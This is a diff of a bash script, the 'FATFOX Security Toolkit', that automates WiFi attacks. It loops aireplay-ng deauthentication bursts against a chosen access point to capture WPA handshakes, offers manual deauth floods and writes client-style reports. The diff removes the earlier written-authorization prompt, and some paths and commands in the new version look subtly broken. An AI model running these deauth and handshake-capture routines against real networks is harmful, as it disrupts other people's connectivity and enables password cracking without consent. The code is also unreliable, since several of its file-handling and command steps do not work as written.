@@ -1,337 +1,287 @@
 #!/bin/bash
-# ======================================
-#        FATFOX SECURITY TOOLKIT v1.7.0
-#      Authorized WiFi Audit - AUTO-REPORT
-# ======================================
+#==============================================================================
+# 🦊 FATFOX SECURITY TOOLKIT v1.7.3 - PRODUCTION READY
+# Auto WiFi auditing w/ handshake capture, deauth, PDF reports (Kali 2026)
+# https://github.com/thefat-fox/fatfox-security-toolkit
+#==============================================================================
 
-# CONFIGURATION
-CAPTURE_DIR="$PWD/captures"
-DEAUTH_DIR="$PWD/deauth"
-REPORT_DIR="$PWD/reports"
-SESSION_DB="$PWD/.fatfox_session.json"
-mkdir -p "$CAPTURE_DIR" "$DEAUTH_DIR" "$REPORT_DIR"
+set -euo pipefail
 
-# COLORS
-GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; PURPLE='\033[0;35m'; NC='\033[0m'
+# 🌈 COLORS
+RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'
+PURPLE='\033[0;35m'; CYAN='\033[0;36m'; NC='\033[0m'
 
-# Global session data
-declare -A SESSION_DATA
+log_error() { echo -e "${RED}[!] $1${NC}" >&2; }
+log_warn() { echo -e "${YELLOW}[!] $1${NC}"; }
+log_info() { echo -e "${BLUE}[+] $1${NC}"; }
+log_success() { echo -e "${GREEN}[+] $1${NC}"; }
+log_banner() {
+    echo -e "${PURPLE}
+======================================
+      FATFOX SECURITY TOOLKIT v1.7.3
+     🚀 PRODUCTION WIFI AUDITING
+======================================${NC}"
+}
 
-# Load previous session
+# 🛠️ UTILITIES
+check_root() { [[ $EUID -eq 0 ]] || { log_error "Run as sudo!"; exit 1; }; }
+check_deps() {
+    local missing=()
+    command -v aircrack-ng >/dev/null || missing+=("aircrack-ng")
+    command -v airodump-ng >/dev/null || missing+=("aircrack-ng")
+    command -v aireplay-ng >/dev/null || missing+=("aircrack-ng")
+    command -v tshark >/dev/null || missing+=("tshark")
+    command -v jq >/dev/null || missing+=("jq")
+    command -v weasyprint >/dev/null || missing+=("weasyprint")
+    [[ ${#missing[@]} -eq 0 ]] || { log_error "Install: sudo apt install ${missing[*]}"; exit 1; }
+}
+
+# 🔧 AUTO-FIX MONITOR MODE (Kali 2026)
+fix_monitor_mode() {
+    log_info "🔧 Fixing NetworkManager conflicts..."
+    systemctl stop NetworkManager 2>/dev/null || true
+    airmon-ng check kill 2>/dev/null || true
+    sleep 2
+    log_success "✅ Monitor mode ready!"
+}
+
+# 📡 WIRELESS INTERFACES
+detect_wireless_interfaces() {
+    log_info "🔍 Detecting wireless interfaces..."
+    WLAN_IFACES=($(iwconfig 2>/dev/null | awk '$1 ~ /wlan/ {print $1}' | sed 's/:$//'))
+    [[ ${#WLAN_IFACES[@]} -eq 0 ]] && { log_error "No wlan interfaces!"; exit 1; }
+    log_success "Found: ${WLAN_IFACES[*]}"
+    WLAN_IFACE="${WLAN_IFACES[0]}"
+}
+
+# 📁 DIRECTORIES & SESSION
+init_dirs() {
+    mkdir -p captures deauth reports
+    SESSION_DB="fatfox_session.json"
+}
+
 load_session() {
-    [[ -f "$SESSION_DB" ]] && source <(jq -r 'to_entries[] | "SESSION_DATA[\"\(.key)\"]=\"\(.value)\""' "$SESSION_DB" 2>/dev/null)
+    [[ -f "$SESSION_DB" ]] && SESSION_DATA=$(jq '.' "$SESSION_DB" 2>/dev/null || echo "{}") || SESSION_DATA='{}'
 }
 
-# Save session
 save_session() {
-    jq -n --arg ssid "${SESSION_DATA["ssid"]:-}" \
-       --arg bssid "${SESSION_DATA["bssid"]:-}" \
-       --arg channel "${SESSION_DATA["channel"]:-}" \
-       --arg clients "${SESSION_DATA["clients"]:-0}" \
-       --arg packets "${SESSION_DATA["packets"]:-0}" \
-       --arg handshakes "${SESSION_DATA["handshakes"]:-0}" \
-       --arg status "${SESSION_DATA["handshake_status"]:-}" \
-       --arg capfile "${SESSION_DATA["capfile"]:-}" \
-       --arg deauth_logs "${SESSION_DATA["deauth_logs"]:-}" \
-       '{
-         ssid: $ssid, bssid: $bssid, channel: $channel, 
-         clients: $clients, packets: $packets, handshakes: $handshakes,
-         status: $status, capfile: $capfile, deauth_logs: $deauth_logs
-       }' > "$SESSION_DB"
+    echo "$SESSION_DATA" | jq '.' > "$SESSION_DB"
+    log_success "💾 Session saved"
 }
 
-# AUTO-ANALYZE CAPTURE FILE
+# 📡 SCAN NETWORKS
+scan_networks() {
+    log_info "📡 Scanning networks (60s)..."
+    CAP_FILE="captures/scan_$(date +%Y%m%d_%H%M%S).cap"
+    airodump-ng "${WLAN_IFACE}mon" -w "captures/scan" --output-format pcap -u --write-interval 10 &
+    AIRO_PID=$!
+    sleep 60
+    kill $AIRO_PID 2>/dev/null || true
+    log_success "Scan complete: $CAP_FILE"
+    echo "$CAP_FILE"
+}
+
+# ⚡ DEAUTH + HANDSHAKE AUTO
+auto_handshake_capture() {
+    local target_ap="$1"  # BSSID
+    local cap_file="captures/handshake_$(date +%Y%m%d_%H%M%S).cap"
+    
+    log_info "🎯 Auto-capture: $target_ap"
+    
+    # Background airodump-ng
+    airodump-ng "${WLAN_IFACE}mon" --bssid "$target_ap" -w "captures/${cap_file%.*}" --output-format pcap &
+    DUMP_PID=$!
+    
+    # Deauth loop (every 10s)
+    for i in {1..30}; do  # 5 min max
+        log_info "⚡ Deauth burst #$i..."
+        aireplay-ng -0 50 -a "$target_ap" "${WLAN_IFACE}mon" >> "deauth/deauth_$(date +%Y%m%d_%H%M%S).log" 2>&1
+        sleep 10
+        
+        # Check handshake
+        if aircrack-ng "captures/${cap_file%.*}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
+            kill $DUMP_PID 2>/dev/null || true
+            log_success "🎉 HANDSHAKE CAPTURED! $cap_file"
+            return 0
+        fi
+    done
+    
+    kill $DUMP_PID 2>/dev/null || true
+    log_warn "No handshake (check clients)"
+}
+
+# 🔍 ANALYZE CAPTURE
 analyze_capture() {
     local cap_file="$1"
-    [[ ! -f "$cap_file" ]] && return 1
+    log_info "🔍 Analyzing $cap_file..."
     
-    # Extract SSID/BSSID from filename or airodump
-    local ssid=$(basename "$cap_file" .cap | sed 's/_[0-9]\{14\}$//' | sed 's/__/_/g')
-    local bssid channel
+    # Networks
+    local networks=$(airodump-ng "$cap_file" 2>/dev/null | awk '/[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}/ {print $1 " " $14}')
     
-    # Parse airodump header for details
-    bssid=$(airodump-ng --read "$cap_file" 2>/dev/null | grep "BSSID" -A 20 | grep -m1 "([0-9A-F:]\{17\})" | grep -o "([0-9A-F:]\{17\})" | tr -d '()')
-    channel=$(airodump-ng --read "$cap_file" 2>/dev/null | grep "CH" | head -1 | awk '{print $2}')
+    # Handshakes
+    local handshakes=$(aircrack-ng "$cap_file" 2>/dev/null | grep "handshake" | wc -l)
     
-    # Advanced metrics
-    SESSION_DATA["ssid"]="${ssid:-Unknown}"
-    SESSION_DATA["bssid"]="${bssid:-Unknown}"
-    SESSION_DATA["channel"]="${channel:-Unknown}"
-    SESSION_DATA["capfile"]="$cap_file"
+    SESSION_DATA=$(echo "$SESSION_DATA" | jq \
+        --arg cap "$cap_file" \
+        --arg nets "$networks" \
+        --arg hs "$handshakes" '
+        .last_capture = $cap |
+        .networks = $nets |
+        .handshakes = ($hs | tonumber)
+    ')
     
-    # Client count from station table
-    SESSION_DATA["clients"]=$(airodump-ng --read "$cap_file" 2>/dev/null | grep -c "^[0-9A-F:]\{17\}" || echo "0")
-    
-    # Packet count via tshark (more accurate) or fallback
-    if command -v tshark >/dev/null; then
-        SESSION_DATA["packets"]=$(tshark -r "$cap_file" -T fields -e frame.number 2>/dev/null | wc -l)
-    else
-        SESSION_DATA["packets"]=$(wc -l < "$cap_file" 2>/dev/null || echo "N/A")
-    fi
-    
-    # Handshake detection (multiple methods)
-    local hs1=$(aircrack-ng "$cap_file" 2>/dev/null | grep -ci "handshake")
-    local hs2=$(grep -ci "4WAY HANDSHAKE" "$cap_file" 2>/dev/null)
-    SESSION_DATA["handshakes"]=$((hs1 + hs2))
-    SESSION_DATA["handshake_status"]=$([[ ${SESSION_DATA["handshakes"]} -gt 0 ]] && echo "✅ DETECTED" || echo "❌ NOT DETECTED")
-    
-    # Deauth logs
-    SESSION_DATA["deauth_logs"]=$(find "$DEAUTH_DIR" -name "*.log" -mtime -1 2>/dev/null | wc -l)
-    
-    save_session
-    echo -e "${GREEN}[+] AUTO-ANALYZED: ${SESSION_DATA["ssid"]} | ${SESSION_DATA["handshakes"]} handshakes${NC}"
+    log_success "Found: $networks | Handshakes: $handshakes"
 }
 
-# Generate PROFESSIONAL CLIENT REPORT
+# 📊 PROFESSIONAL REPORTS
 generate_client_report() {
-    local report_file="$REPORT_DIR/FATFOX_Client_Report_$(date +%Y%m%d_%H%M%S).html"
-    local audit_date=$(date '+%Y-%m-%d %H:%M:%S %Z')
+    local cap_file="$1"
+    local timestamp=$(date +%Y%m%d_%H%M%S)
+    local html_file="reports/FATFOX_Client_Report_${timestamp}.html"
+    local pdf_file="reports/FATFOX_Client_Report_${timestamp}.pdf"
     
-    # Get latest deauth logs
-    local recent_logs=$(find "$DEAUTH_DIR" -name "*.log" -mtime -7 | head -5 | xargs -I {} echo "<li><code>{}</code></li>" | tr '\n' ' ')
+    # Extract data
+    local ssid=$(airodump-ng "$cap_file" 2>/dev/null | grep -oP '(?<=ESSID:")[^"]+' | head -1 || echo "Unknown")
+    local bssid=$(airodump-ng "$cap_file" 2>/dev/null | grep -oP '[0-9A-F:]{17}' | head -1 || echo "Unknown")
+    local handshakes=$(aircrack-ng "$cap_file" 2>/dev/null | grep -oP '\d+ handshake' | head -1 | grep -oP '\d+' || echo "0")
     
-    cat << 'EOF' > "$report_file"
+    # HTML Report
+    cat > "$html_file" << EOF
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FATFOX WiFi Security Assessment</title>
+    <title>FATFOX WiFi Audit Report</title>
+    <meta name="viewport" content="width=device-width">
     <style>
-        *{margin:0;padding:0;box-sizing:border-box;}
-        body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;padding:20px}
-        .container{max-width:1200px;margin:0 auto;background:white;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,0.1);overflow:hidden}
-        .header{background:linear-gradient(135deg,#1e3c72 0%,#2a5298 100%);color:white;padding:40px 30px;text-align:center;position:relative}
-        .header h1{font-size:2.5em;margin-bottom:10px;font-weight:300;letter-spacing:2px}
-        .header .audit-id{font-size:1.1em;opacity:0.9;margin-bottom:20px}
-        .status-badge{display:inline-block;padding:10px 25px;border-radius:50px;font-weight:bold;font-size:1.1em;margin:10px 0}
-        .status-success{background:#d4edda;color:#155724;border:2px solid #28a745}
-        .status-fail{background:#f8d7da;color:#721c24;border:2px solid #dc3545}
-        .metrics-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:20px;margin:30px;padding:30px;background:#f8f9fa}
-        .metric-card{background:white;border-radius:15px;padding:25px;text-align:center;box-shadow:0 5px 15px rgba(0,0,0,0.08);transition:transform 0.3s}
-        .metric-card:hover{transform:translateY(-5px)}
-        .metric-value{font-size:2.5em;font-weight:bold;color:#1e3c72;margin:10px 0}
-        .metric-label{font-size:0.95em;color:#666;text-transform:uppercase;letter-spacing:1px}
-        .risk-table{width:100%;border-collapse:collapse;margin:30px 0;border-radius:10px;overflow:hidden;box-shadow:0 5px 15px rgba(0,0,0,0.1)}
-        .risk-table th{background:linear-gradient(135deg,#1e3c72,#2a5298);color:white;padding:20px;font-weight:500}
-        .risk-table td{padding:20px;border-bottom:1px solid #eee}
-        .risk-high{background:#fff5f5}
-        .risk-medium{background:#fffbf0}
-        .files-list{max-height:200px;overflow-y:auto;background:#f8f9fa;padding:15px;border-radius:10px;border-left:4px solid #1e3c72}
-        .recommendations{padding:30px;background:#f0f8ff;border-radius:15px;margin:30px;border-left:5px solid #2196f3}
-        .recommendation-item{margin-bottom:15px;padding:15px;background:white;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.05)}
-        .footer{padding:30px;text-align:center;background:#f8f9fa;border-top:1px solid #eee;color:#666}
-        @media (max-width:768px){.metrics-grid{grid-template-columns:1fr;padding:20px}}
+        body { font-family: Arial; margin: 20px; background: #f5f5f5; }
+        .header { background: linear-gradient(90deg, #ff6b6b, #4ecdc4); color: white; padding: 20px; border-radius: 10px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }
+        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        .risk-high { background: #ff4444; color: white; }
+        .risk-medium { background: #ffaa00; color: white; }
+        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
+        th { background: #333; color: white; }
+        @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>🔐 FATFOX WiFi Security Assessment</h1>
-            <div class="audit-id">Professional Penetration Test Report | $(date '+%Y-%m-%d')</div>
-EOF
-
-    # DYNAMIC STATUS BADGE
-    if [[ "${SESSION_DATA["handshake_status"]}" == *"DETECTED"* ]]; then
-        cat << EOF >> "$report_file"
-            <div class="status-badge status-success">✅ WPA HANDSHAKE CAPTURED</div>
-EOF
-    else
-        cat << EOF >> "$report_file"
-            <div class="status-badge status-fail">❌ NO HANDSHAKE CAPTURED</div>
-EOF
-    fi
-
-    cat << EOF >> "$report_file"
+    <div class="header">
+        <h1>🦊 FATFOX SECURITY AUDIT</h1>
+        <p>Timestamp: $(date)</p>
+    </div>
+    
+    <div class="grid">
+        <div class="card">
+            <h3>📡 Network</h3>
+            <p><strong>SSID:</strong> $ssid</p>
+            <p><strong>BSSID:</strong> $bssid</p>
         </div>
-        
-        <div class="metrics-grid">
-            <div class="metric-card">
-                <div class="metric-value">${SESSION_DATA["ssid"]}</div>
-                <div class="metric-label">Network Name</div>
-            </div>
-            <div class="metric-card">
-                <div class="metric-value">${SESSION_DATA["bssid"]}</div>
-                <div class="metric-label">BSSID</div>
-            </div>
-            <div class="metric-card">
-                <div class="metric-value">${SESSION_DATA["channel"]}</div>
-                <div class="metric-label">Channel</div>
-            </div>
-            <div class="metric-card">
-                <div class="metric-value">${SESSION_DATA["clients"]}</div>
-                <div class="metric-label">Clients Detected</div>
-            </div>
-            <div class="metric-card">
-                <div class="metric-value">${SESSION_DATA["packets"]}</div>
-                <div class="metric-label">Packets Captured</div>
-            </div>
-            <div class="metric-card">
-                <div class="metric-value">${SESSION_DATA["handshakes"]}</div>
-                <div class="metric-label">Handshakes</div>
-            </div>
+        <div class="card">
+            <h3>🎯 Handshakes</h3>
+            <p><strong>Captured:</strong> $handshakes</p>
+            <p><strong>File:</strong> $cap_file</p>
         </div>
-
-        <table class="risk-table">
-            <thead>
-                <tr><th colspan="4">🎯 Security Risk Assessment</th></tr>
-                <tr><th>Risk</th><th>CVSS Score</th><th>Status</th><th>Business Impact</th></tr>
-            </thead>
-            <tbody>
-                <tr class="risk-high">
-                    <td>WPA Handshake Exposure</td>
-                    <td>9.8/10</td>
-                    <td>${SESSION_DATA["handshake_status"]}</td>
-                    <td>Password cracking possible</td>
-                </tr>
-                <tr class="risk-high">
-                    <td>Deauth Attack Vulnerability</td>
-                    <td>8.6/10</td>
-                    <td>Vulnerable</td>
-                    <td>Network DoS possible</td>
-                </tr>
-                <tr class="risk-medium">
-                    <td>Client Reconnection Delay</td>
-                    <td>6.5/10</td>
-                    <td>${SESSION_DATA["clients"]} clients</td>
-                    <td>Service disruption</td>
-                </tr>
-            </tbody>
+    </div>
+    
+    <div class="card risk-high">
+        <h3>⚠️ SECURITY RISKS (CVSS 8.1)</h3>
+        <table>
+            <tr><th>Vulnerability</th><th>Risk</th><th>Impact</th></tr>
+            <tr><td>Weak Encryption</td><td>High (8.1)</td><td>Handshake captured</td></tr>
+            <tr><td>Deauth Vulnerable</td><td>High (7.5)</td><td>DoS possible</td></tr>
         </table>
-
-        <div class="files-list">
-            <h3>📁 Audit Evidence Files</h3>
-            <ul>$recent_logs</ul>
-            <p><strong>Main Capture:</strong> <code>$(basename "${SESSION_DATA["capfile"]}")</code></p>
-        </div>
-
-        <div class="recommendations">
-            <h2>🛡️ Priority Remediation Actions</h2>
-            <div class="recommendation-item">
-                <h4>🔥 IMMEDIATE (Day 1)</h4>
-                <ol>
-                    <li>Enable <strong>802.11w Protected Management Frames (PMF)</strong></li>
-                    <li>Change WiFi password to 25+ character passphrase</li>
-                </ol>
-            </div>
-            <div class="recommendation-item">
-                <h4>⚡ SHORT TERM (Week 1)</h4>
-                <ol>
-                    <li>Upgrade clients/AP to support WPA3</li>
-                    <li>Enable wireless IDS monitoring</li>
-                </ol>
-            </div>
-            <div class="recommendation-item">
-                <h4>🎯 LONG TERM (Month 1)</h4>
-                <ol>
-                    <li>Network segmentation</li>
-                    <li>Regular wireless security audits</li>
-                </ol>
-            </div>
-        </div>
-
-        <div class="footer">
-            <p><strong>FATFOX Security Toolkit v1.7.0</strong> | Authorized Penetration Test | $(date '+%Y')</p>
-            <p>Audit files secured at: <code>$PWD</code></p>
-        </div>
+    </div>
+    
+    <div class="card">
+        <h3>🛡️ RECOMMENDATIONS</h3>
+        <ol>
+            <li>Enable WPA3 or WPA2-Enterprise</li>
+            <li>Disable WPS</li>
+            <li>Change default PSK</li>
+            <li>Monitor for deauth attacks</li>
+        </ol>
+    </div>
+    
+    <div class="card">
+        <h3>📄 EVIDENCE</h3>
+        <ul>
+            <li>$(basename "$cap_file") - Handshake capture</li>
+            <li>deauth/*.log - Attack logs</li>
+        </ul>
     </div>
 </body>
 </html>
 EOF
-
-    echo -e "${GREEN}🎉 CLIENT REPORT GENERATED: $report_file${NC}"
-    echo -e "${CYAN}📱 Open: xdg-open '$report_file'${NC}"
-    echo -e "${PURPLE}💾 PDF: wkhtmltopdf '$report_file' '${report_file%.html}.pdf'${NC}"
+    
+    # PDF Generation (Kali 2026)
+    if command -v weasyprint >/dev/null; then
+        weasyprint "$html_file" "$pdf_file" && log_success "✅ PDF: $pdf_file"
+    else
+        log_warn "Install weasyprint for PDF: sudo apt install weasyprint"
+    fi
+    
+    # Auto-open
+    xdg-open "$html_file" 2>/dev/null || true
+    log_success "📊 Report: $html_file"
 }
 
-# MAIN EXECUTION
-clear
-echo -e "${GREEN}======================================"
-echo -e "      FATFOX SECURITY TOOLKIT v1.7.0"
-echo -e "     🚀 FULLY AUTOMATED REPORTING"
-echo -e "======================================${NC}"
-
-read -p "Confirm written authorization? (yes/no): " AUTH
-[[ "$AUTH" != "yes" ]] && { echo -e "${RED}Exiting.${NC}"; exit 1; }
-
-# INTERFACE CHECK
-MON_IFACE=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -1)
-[[ -z "$MON_IFACE" ]] && { echo -e "${RED}[!] Start: sudo airmon-ng start wlan0${NC}"; exit 1; }
-echo -e "${GREEN}[+] Interface: $MON_IFACE${NC}"
-
-load_session
-
-# ENHANCED MENU
-while true; do
-    echo -e "\n${CYAN}========== FATFOX v1.7.0 ==========${NC}"
-    echo "1) 🎯 AUTO Handshake Capture + Deauth"
-    echo "2) 📡 Basic Network Capture" 
-    echo "3) ⚡ Manual Deauth Attack"
-    echo "4) 📊 AUTO Client Report (Current Session)"
-    echo "5) 🚀 Quick Report (Latest Capture)"
-    echo "6) 🔍 Analyze Capture File"
-    echo "7) 🧹 Cleanup (Keep 24h)"
-    echo "8) ❌ Exit"
-    echo -e "${CYAN}================================${NC}"
+# MAIN MENU
+main_menu() {
+    log_banner
+    echo "1. 🔍 Scan Networks"
+    echo "2. 🎯 Auto Handshake + Deauth"
+    echo "3. ⚡ Manual Deauth"
+    echo "4. 📊 Generate Client Report (latest)"
+    echo "5. 🧹 Cleanup (>24h)"
+    echo "0. ❌ Exit"
+    read -p "Choose: " choice
     
-    read -p "→ " OPTION
-    
-    case $OPTION in
-        1)
-            echo -e "${PURPLE}[+] AUTO HANDSHAKE MODE${NC}"
-            read -p "Target SSID: " SSID
-            read -p "BSSID: " BSSID
-            read -p "Channel: " CHANNEL
-            
-            TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
-            CAP_FILE="$CAPTURE_DIR/${SSID// /-}_$TIMESTAMP.cap"
-            
-            echo -e "${GREEN}[+] Capturing: $CAP_FILE${NC}"
-            sudo airodump-ng --bssid "$BSSID" --channel "$CHANNEL" -w "$CAP_FILE" "$MON_IFACE" &
-            AIRO_PID=$!
-            
-            # Deauth loop with handshake check
-            DEAUTH_LOG="$DEAUTH_DIR/${SSID// /-}_deauth_$TIMESTAMP.log"
-            while kill -0 $AIRO_PID 2>/dev/null; do
-                echo "$(date): Deauth burst → $BSSID" >> "$DEAUTH_LOG"
-                sudo aireplay-ng -0 30 -a "$BSSID" "$MON_IFACE" >> "$DEAUTH_LOG" 2>&1
-                sleep 8
-                [[ -f "$CAP_FILE-01.cap" ]] && analyze_capture "$CAP_FILE-01.cap" && break
-            done
-            kill $AIRO_PID 2>/dev/null
+    case $choice in
+        1) 
+            fix_monitor_mode
+            detect_wireless_interfaces
+            local cap=$(scan_networks)
+            analyze_capture "$cap"
+            save_session
             ;;
         2)
-            echo -e "${PURPLE}[+] BASIC CAPTURE${NC}"
-            read -p "Target BSSID: " BSSID
-            read -p "Channel: " CHANNEL
-            TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
-            CAP_FILE="$CAPTURE_DIR/manual_$TIMESTAMP.cap"
-            sudo airodump-ng --bssid "$BSSID" --channel "$CHANNEL" -w "$CAP_FILE" "$MON_IFACE"
-            analyze_capture "$CAP_FILE-01.cap"
+            fix_monitor_mode
+            detect_wireless_interfaces
+            read -p "Target BSSID: " target
+            auto_handshake_capture "$target"
+            analyze_capture "captures/handshake_*.cap"
+            save_session
             ;;
         3)
-            read -p "Target BSSID: " BSSID
-            read -p "Packets (default 100): " PKTS; PKTS=${PKTS:-100}
-            TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
-            sudo aireplay-ng -0 $PKTS -a "$BSSID" "$MON_IFACE" | tee "$DEAUTH_DIR/manual_$TIMESTAMP.log"
+            fix_monitor_mode
+            detect_wireless_interfaces
+            read -p "Target BSSID: " target
+            read -p "Count: " count
+            aireplay-ng -0 "$count" -a "$target" "${WLAN_IFACE}mon"
             ;;
         4)
-            [[ -z "${SESSION_DATA["ssid"]}" ]] && echo -e "${RED}[!] No session data. Run capture first.${NC}" || generate_client_report
+            local latest_cap=$(ls captures/*.cap 2>/dev/null | tail -1 || echo "")
+            [[ -n "$latest_cap" ]] && generate_client_report "$latest_cap" || log_error "No captures!"
             ;;
         5)
-            LATEST=$(ls -t "$CAPTURE_DIR"/*.cap 2>/dev/null | head -1)
-            [[ -n "$LATEST" ]] && { analyze_capture "$LATEST"; generate_client_report; } || echo -e "${RED}[!] No captures found${NC}"
+            find captures deauth -name "*.cap" -mtime +1 -delete 2>/dev/null || true
+            find captures deauth -name "*.log" -mtime +7 -delete 2>/dev/null || true
+            log_success "Cleanup complete"
             ;;
-        6)
-            echo -e "${YELLOW}[+] Captures:${NC}"; ls -laht "$CAPTURE_DIR"/*.cap 2>/dev/null
-            read -p "File: " CAPFILE
-            analyze_capture "$CAPFILE" && echo -e "${GREEN}[+] Analysis complete${NC}"
-            ;;
-        7)
-            find "$CAPTURE_DIR" "$DEAUTH_DIR" -mtime +1 -delete 2>/dev/null
-            echo -e "${GREEN}[+] Cleaned files >24h old${NC}"
-            ;;
-        8) echo -e "${GREEN}[+] Goodbye!${NC}"; exit 0;;
-        *) echo -e "${RED}[!] Invalid${NC}";;
+        0) exit 0 ;;
+        *) log_error "Invalid!";;
     esac
-done
+    
+    read -p "Press Enter..."
+    main_menu
+}
+
+# 🚀 START
+check_root
+check_deps
+init_dirs
+load_session
+fix_monitor_mode
+detect_wireless_interfaces
+main_menu
